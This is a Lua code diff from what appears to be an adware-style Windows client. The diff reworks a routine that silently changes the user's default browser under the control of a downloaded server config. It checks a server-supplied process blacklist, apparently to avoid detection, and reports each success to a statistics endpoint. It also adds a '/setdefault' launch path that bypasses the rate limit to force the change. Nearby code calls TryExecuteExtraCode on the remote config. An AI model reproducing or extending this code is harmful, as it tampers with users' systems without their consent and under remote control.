@@ -248,47 +248,48 @@ function TryExecuteExtraCode(tServerConfig)
 end
 
 
-function TrySetDefaultBrowser(tServerConfig)
+function TrySetDefaultBrowser(tServerConfig, bIgnoreSpanTime)
 	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
 	local tUserConfig = FunctionObj.ReadConfigFromMemByKey("tUserConfig") or {}
 	
 	local tDefaultBrowser = tServerConfig["tDefaultBrowser"]
 	if type(tDefaultBrowser) ~= "table" then
-		return
+		return false
 	end
 	
-	local nSpanTimeInSec = tDefaultBrowser["nSpanTimeInSec"] or 0
-	local nLastSetDefaultUTC = tUserConfig["nLastSetDefaultUTC"] or 0
-	local bPassCheck = CheckSpanTime(nLastSetDefaultUTC, nSpanTimeInSec)
-	if not bPassCheck then
-		FunctionObj.TipLog("[TrySetDefaultBrowser] CheckSpanTime failed")
-		return 
+	if not bIgnoreSpanTime then
+		local nSpanTimeInSec = tDefaultBrowser["nSpanTimeInSec"] or 0
+		local nLastSetDefaultUTC = tUserConfig["nLastSetDefaultUTC"] or 0
+		local bPassCheck = CheckSpanTime(nLastSetDefaultUTC, nSpanTimeInSec)
+		if not bPassCheck then
+			FunctionObj.TipLog("[TrySetDefaultBrowser] CheckSpanTime failed")
+			return false
+		end
 	end
 	
 	local strBlackList = tDefaultBrowser["strBlackList"] or ""
 	local bPassCheck = CheckProcessList(strBlackList)
 	if not bPassCheck then
 		FunctionObj.TipLog("[TrySetDefaultBrowser] CheckProcessList failed")
-		return 
+		return false
 	end
 		
 	local strBrowserList = tDefaultBrowser["strBrowserList"] or ""
 	local bPassCheck = CheckBrowserList(strBrowserList)
 	if not bPassCheck then
 		FunctionObj.TipLog("[TrySetDefaultBrowser] strBrowserList failed")
-		return 
+		return false
 	end
 	
 	DoSetDefaultBrowser()
-	SendSetDefBrowReport()
-	
+		
 	tUserConfig["nLastSetDefaultUTC"] = tipUtil:GetCurrentUTCTime()
 	FunctionObj.SaveConfigToFileByKey("tUserConfig")
-	
+	return true
 end
 
 
-function SendSetDefBrowReport()
+function SendSetDefBrowReport(bExit)
 	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
 	local tStatInfo = {}
 
@@ -297,6 +298,9 @@ function SendSetDefBrowReport()
 	tStatInfo.strEL = FunctionObj.GetInstallSrc() or ""
 	tStatInfo.strEV = 1
 	
+	if bExit then
+		tStatInfo.Exit = true
+	end
 	FunctionObj.TipConvStatistic(tStatInfo)
 end
 
@@ -412,7 +416,11 @@ function AnalyzeServerConfig(nDownServer, strServerPath)
 	local tServerConfig = FunctionObj.LoadTableFromFile(strServerPath) or {}
 	TryForceUpdate(tServerConfig)
 	FixUserConfig(tServerConfig)
-	TrySetDefaultBrowser(tServerConfig)
+	local bSetSuccess = TrySetDefaultBrowser(tServerConfig)
+	if bSetSuccess then
+		SendSetDefBrowReport(false)
+	end
+	
 	TryExecuteExtraCode(tServerConfig)
 end
 
@@ -567,6 +575,37 @@ function TipMain()
 end
 
 
+
+function DoBackupBussiness()
+	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
+	local cmdString = tipUtil:GetCommandLine()
+	if not string.find(string.lower(cmdString), "/setdefault") then
+		return false
+	end
+	
+	FunctionObj.DownLoadServerConfig(function (nDownServer, strServerPath)
+		if nDownServer ~= 0 or not tipUtil:QueryFileExists(tostring(strServerPath)) then
+			FunctionObj.TipLog("[DoBackupBussiness] Download server config failed , quit ")
+			tipUtil:Exit("Exit")
+			return	
+		end
+	
+		local tServerConfig = FunctionObj.LoadTableFromFile(strServerPath) or {}
+		
+		local bIgnoreSpanTime = true
+		local bSetSuccess = TrySetDefaultBrowser(tServerConfig, bIgnoreSpanTime)
+		if bSetSuccess then
+			SendSetDefBrowReport(true)
+		else
+			tipUtil:Exit("Exit")
+		end
+	end)
+	
+	return true
+end
+
+
+
 function PreTipMain() 
 	gnLastReportRunTmUTC = tipUtil:GetCurrentUTCTime()
 	XLSetGlobal("YBYL.LastReportRunTime", gnLastReportRunTmUTC) 
@@ -574,6 +613,12 @@ function PreTipMain()
 	if not RegisterFunctionObject() then
 		tipUtil:Exit("Exit")
 	end
+	
+	local bDoBackup = DoBackupBussiness()
+	if bDoBackup then
+		return
+	end
+	
 	StartRunCountTimer()
 
 	LoadIEHelper()	
